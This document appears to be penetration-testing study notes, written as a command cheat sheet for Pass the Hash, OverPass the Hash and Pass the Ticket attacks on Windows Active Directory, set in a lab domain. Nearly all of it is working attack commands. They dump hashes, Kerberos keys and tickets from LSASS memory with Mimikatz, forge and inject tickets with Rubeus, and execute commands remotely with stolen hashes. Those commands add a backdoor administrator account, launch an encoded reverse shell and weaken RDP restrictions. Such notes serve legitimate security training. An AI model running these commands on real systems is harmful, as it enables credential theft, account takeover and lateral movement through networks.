##  Pass the Hash (PtH)
 With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a `Pass the Hash (PtH) Attack`.
 
```bash
# from Windows

## Pass the Hash with Mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<hash> /domain:<domain> /run:cmd.exe" exit  # Pass the Hash with Mimikatz , <domain> if it local we use the localhost or computure name or done (.)

## Invoke-TheHash eith SMB
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <Domain> -Username <user> -Hash <NTLM_hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

## Invoke-TheHash with WMI
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target <IP> -Domain <Domain> -Username <user> -Hash <NTLM_hash> -Command "powershell -e <PS_reverse_shell>"

# -<DOMAIN> is unnecessary with local accounts or when using the @domain after the username.
# -Target <Machine-Name> on domain env
-----------------------------------------------------------------------------
# From Linux 

## Pass the Hash with Impacket PsExec
impacket-psexec administrator@10.129.201.126 -hashes :<hash> # on domain : MS01.inlanefreight.htb/administrator@10.129.204.23
#  also we can use:  impacket-wmiexec   impacket-atexec   impacket-smbexec 

## Pass the Hash with CrackMapExec
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami # on domain: -d MS01.inlanefreight.htb

## Pass the Hash with evil-winrm (Linux)
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453 # on domain use administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f # Enable Restricted Admin Mode to Allow PtH
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B #
## on local administrative accounts UAC Limits Pass the Hash for Local Accounts : UAC (User Account Control) limits local users' ability to perform remote administration operations 
# `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0 => admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well
#> if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

```

## Pass the Ticket (PtT) from Windows
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack,
```bash
# Harvesting Kerberos Tickets from Windows
## On Windows, tickets are processed and stored by the LSASS
    
## Mimikatz - Export Tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit 
dir *.kirbi #=> [randomvalue]-username@service-domain.local.kirbi
[randomvalue]-username@krbtgt-domain.local.kirbi #=> the TGT of that account
 
[+] #Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.

## Rubeus - Export Tickets
Rubeus.exe dump /nowrap # base64 format.

---------------------------------------------------------------------------
# Pass the Key or OverPass the Hash

## Mimikatz - Extract Kerberos Keys
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" # dump Kerberos keys from LSASS memory

# Output:
# Auth ID     → Session ID
# User/Domain → Targeted account info
# aes256_hmac → Strong Kerberos key (AES)
# rc4_hmac_nt → NTLM-based key (used in OverPass-the-Hash)
# rc4_md4     → Old NT hash key
# *_exp/_old  → Expired/legacy keys (can still work)

[+] # rc4_hmac_nt used in Rubeus or Mimikatz to craft TGT:

## Mimikatz - Pass the Key or OverPass the Hash
mimikatz.exe  "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f" # open `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

## Rubeus - Pass the Key or OverPass the Hash
Rubeus asktgt /user:plaintext /rc4:<rc4_hmac_nt> /domain:inlanefreight.htb /nowrap # forge a ticket on base64 format, the hash which can be `/rc4`, `/aes128`, `/aes256`, `/des`. we collect using Mimikatz `sekurlsa::ekeys`

[!] # **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."
-----------------------------------------------------------------------------
# Pass the Ticket (PtT)

## Rubeus Pass the Ticket
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt # submit the ticket (TGT or TGS) to the current logon session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi # import the ticket into the current session
### Pass the Ticket - Base64 Format
### we can perform a Pass the Ticket providing the base64 string instead of the file name.
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))  ## Convert .kirbi to Base64 Format
Rubeus.exe ptt /ticket:<BASE64> 

## Mimikatz - Pass the Ticket
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
dir \\DC01.inlanefreight.htb\c$
[!] # Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.
-------------------------------------------------------------------------------
# Mimikatz - PowerShell Remoting with Pass the Ticket

## Mimikatz - Pass the Ticket for Lateral Movement.
mimikatz.exe
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
whoami ; hostname  # inlanefreight\john ; DC01

## Rubeus - Pass the Ticket for Lateral Movement
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
whoami ; hostname  # inlanefreight\john ; DC01
```


